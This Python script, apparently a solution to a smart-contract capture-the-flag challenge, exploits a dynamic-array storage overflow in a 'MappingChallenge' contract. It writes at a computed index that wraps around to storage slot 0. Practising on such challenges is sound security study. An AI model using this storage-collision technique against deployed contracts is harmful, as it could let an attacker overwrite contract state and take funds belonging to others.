import math
from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    MappingChallenge
)
from scripts.helpful_scripts import (
    get_account,
    get_challenge_contract,
    check_solution,
)
from web3 import Web3


def main():
    player = get_account("player")
    challenge_contract = get_challenge_contract(MappingChallenge, "mapping", [], {"from": player})

    array_start = Web3.toInt(Web3.solidityKeccak(['uint256'], [1]))
    tx = challenge_contract.set(2 ** 256 - array_start, 1, {"from": player})
    tx.wait(1)

    check_solution(challenge_contract.address)